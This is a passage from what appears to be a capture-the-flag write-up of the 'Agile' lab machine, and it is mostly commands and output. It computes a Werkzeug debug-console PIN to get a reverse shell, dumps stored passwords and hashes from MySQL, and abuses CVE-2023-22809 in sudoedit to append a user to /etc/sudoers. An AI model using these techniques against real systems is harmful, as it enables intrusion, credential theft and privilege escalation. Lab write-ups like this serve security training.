Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 19:10:49 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '33', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
ed5b159560f54721827644bc9b220d00
```
- `ed5b159560f54721827644bc9b220d00superpass.service`

Next, reading `/proc/self/cgroup`
```bash
python lfi.py /../../../../proc/self/cgroup
Status Code: 200
Response Headers: {'Server': 'nginx/1.18.0 (Ubuntu)', 'Date': 'Mon, 22 Apr 2024 19:11:25 GMT', 'Content-Type': 'text/csv; charset=utf-8', 'Content-Length': '35', 'Connection': 'close', 'Content-Disposition': 'attachment; filename=superpass_export.csv', 'Vary': 'Cookie'}
Response Body: 
0::/system.slice/superpass.service
```

Now setting all the variables for the PIN script:
```python
#!/usr/bin/python3
import binascii
import hashlib
from itertools import chain

mac_address = "00:50:56:b9:f1:5d"
mac_addr_int = int(mac_address.replace(":", ""), 16)
print(f"MAC: {mac_address}\n\nMAC(int): {mac_addr_int}")

public_bits = [
        'www-data',
        'flask.app',
        'wsgi_app',
        '/app/venv/lib/python3.10/site-packages/flask/app.py'
        ]
private_bits = [
        str(mac_addr_int),  # Convert integer to string here
        'ed5b159560f54721827644bc9b220d00superpass.service'
        ]

h = hashlib.sha1()
for bit in chain(public_bits, private_bits):
    if bit:  # This checks if bit is not empty or None
        h.update(bit.encode('utf-8'))  # Ensure bit is encoded as bytes

h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]
num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num
    print("Pin: ", rv)

```
Now, running the script:
```bash
MAC: 00:50:56:b9:f1:5d

MAC(int): 345052410205
Pin:  104-550-891
```

Using this pin, after intentionally triggering an error in the application we can click on the console icon, enter the pin and obtain access to a python interpreter in the browser to then send ourselves a reverse shell.

![[Pasted image 20240422153224.png]]

![[Pasted image 20240422153232.png]]

Now that we have a foothold, lets explore the sql database using the credentials we found earlier with the command:

```
mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' -h localhost -D superpass
```

```bash
SELECT * FROM passwords;
SELECT * FROM passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
```
`users` table
```bash
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | test     | $6$rounds=200000$wvSq.ZoVTkjuSOwC$Ov6qW6LSMy.phzpzpAylrjkAkbdaDg/dg53322SU8MVPaJgbJEBqlhdz8asl7K82wmBGfuCMHY7yQUQMIA5Lp1 |
```

Now, using `corum:5db7caa1d13cc37c9fc2` we can gain SSH access.

After running `netstat -a` we see there is another service running on port `5555`. After forwarding this remote port to our local host with the command:
```bash
ssh corum@$IP -L 5555:127.0.0.1:5555
```

we can see that on `http://localhost:5555` is the same service. Repeating the same steps as above, we can obtain the user credentials saved:

```css
edwards:d07867c6267dcb5df0af
```
[CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)
Sudoers policy bypass in Sudo Version 1.9.12p1 when using sudoedit. 
```bash
./pspy64                                                                                                                                                                                          
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d                                                                                                                                      

     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                                                                                                            
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                                                                                                            
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                                                                                                            
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░                                                                                                                                                                            
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░                                                                                                                                                                            
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒                                                                                                                                                                             
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                                                                                                             
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                                                                                                              
                   ░           ░ ░                                                                                                                                                                                 
                               ░ ░                                                                                                                                                                                 

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursiv
e) | [] (non-recursive)                                                                                                                                                                                            
Draining file system events due to startup...                                                                                                                                                                      
done                                                                                                                                                                                                               
<SNIP>
2023/03/10 05:41:55 CMD: UID=1002  PID=1326   | grep --color=auto activate 
2023/03/10 05:41:55 CMD: UID=1002  PID=1320   | vim /var/tmp/activate.XXfIlGzM /var/tmp/config_testXXXyfw94.json 
2023/03/10 05:45:01 CMD: UID=0     PID=1480   | /bin/bash -c source /app/venv/bin/activate
```

The file we need to modify isn't writable, but we can work around this limitation by exploiting a vulnerability known as `CVE-2023-22809` in `sudoedit`. This enables a user authorized to edit a file using `sudoedit` to edit other files even without write permissions.

The user `root` periodically sources the file located at `/app/venv/bin/activate`. Therefore, our plan is to tamper with this sourced file to gain access as the `root` user when it is sourced by `root`. To exploit this, we just need to export the following env variable:

```bash
export EDITOR='vim -- /app/venv/bin/activate'
```
```bash
edwards@agile:~$ sudo -u dev_admin sudoedit /app/config_test.json
sudo: sudoedit doesn't need to be run via sudo
sudo: --: Permission denied
2 files to edit
sudo: /app/config_test.json unchanged
edwards@agile:~$
```

In this case we try to change the add ourselves to the `sudoers` group by changing the activate program that is going to execute by root.
`cat /app/venv/bin/activate`
```bash
echo "edwards ALL=(ALL:ALL) ALL" >>/etc/sudoers
```

Or simply run the command to open the file and add